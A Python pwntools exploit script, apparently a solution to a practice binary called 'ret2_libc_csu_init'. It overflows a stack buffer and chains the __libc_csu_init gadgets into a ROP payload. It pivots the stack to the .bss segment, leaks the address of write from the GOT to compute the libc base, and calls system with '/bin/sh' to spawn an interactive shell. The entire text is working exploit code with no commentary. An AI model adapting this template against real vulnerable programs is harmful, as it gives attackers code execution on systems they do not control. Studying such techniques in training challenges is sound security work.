from pwn import *

p = process("./ret2_libc_csu_init")
gdb.attach(p,"b *0x000000000040071A")
elf = ELF("./ret2_libc_csu_init")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

def rop(p1,p2,p3,call_addr):
	pop6_ret = 0x000000000040079A # rbx,rbp,r12,r13,r14,r15
	call_rop = 0x0000000000400780 # rdx < r13;rsi < r14;rdi < r15
	#rbx = 0;rbp = 1;r12 = call_addr
	payload = ""
	payload += p64(pop6_ret) + p64(0) + p64(1) + p64(call_addr) + p64(p3) + p64(p2) + p64(p1)
	payload += p64(call_rop)
	payload += p64(0) * 7
	return payload
	
bss_addr = 0x0000000000601800
rop_addr = 0x0000000000601300
rsp3 = 0x000000000040079d

p.recvuntil("ret2_libc_csu_init\n")
payload1 = "a" * 0x100 + "junkjunk"
payload1 += rop(0,rop_addr,0x300,elf.got["read"])
payload1 += p64(rsp3) + p64(rop_addr - 0x18)
payload1 = payload1.ljust(0x200,"\x00")
p.send(payload1)

rop_data = ""
rop_data += rop(1,elf.got["write"],8,elf.got["write"])
rop_data += rop(0,bss_addr,0x10,elf.got["read"])
rop_data += rop(bss_addr,0,0,bss_addr + 8)
rop_data = rop_data.ljust(0x300,"\x00")
assert len(rop_data) <= 0x300
p.send(rop_data)

leak_addr = u64(p.recv(8))
libc_base = leak_addr - libc.symbols["write"]
libc.address = libc_base
log.success("libc_base:" + hex(libc.address))

system = libc.symbols["system"]
payload2 = "/bin/sh\x00" + p64(system)
p.send(payload2)
p.interactive()
